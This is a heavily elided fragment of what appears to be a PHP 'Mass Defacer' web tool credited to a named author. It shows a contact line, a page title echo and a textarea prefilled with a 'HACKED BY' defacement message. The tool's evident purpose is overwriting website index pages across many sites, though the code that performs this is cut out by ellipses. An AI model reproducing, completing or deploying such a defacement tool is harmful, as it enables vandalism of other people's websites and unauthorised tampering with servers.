...
Contact => http://facebook.com/sid.gifari

*/

echo "<title>Mass Defacer - By Sid Gifari</title>";
...
echo "Your Index : <br><textarea style='width: 785px; height: 330px;' name='index'>HACKED BY SID GIFARI FROM TEAM_CC ..
..
..
...
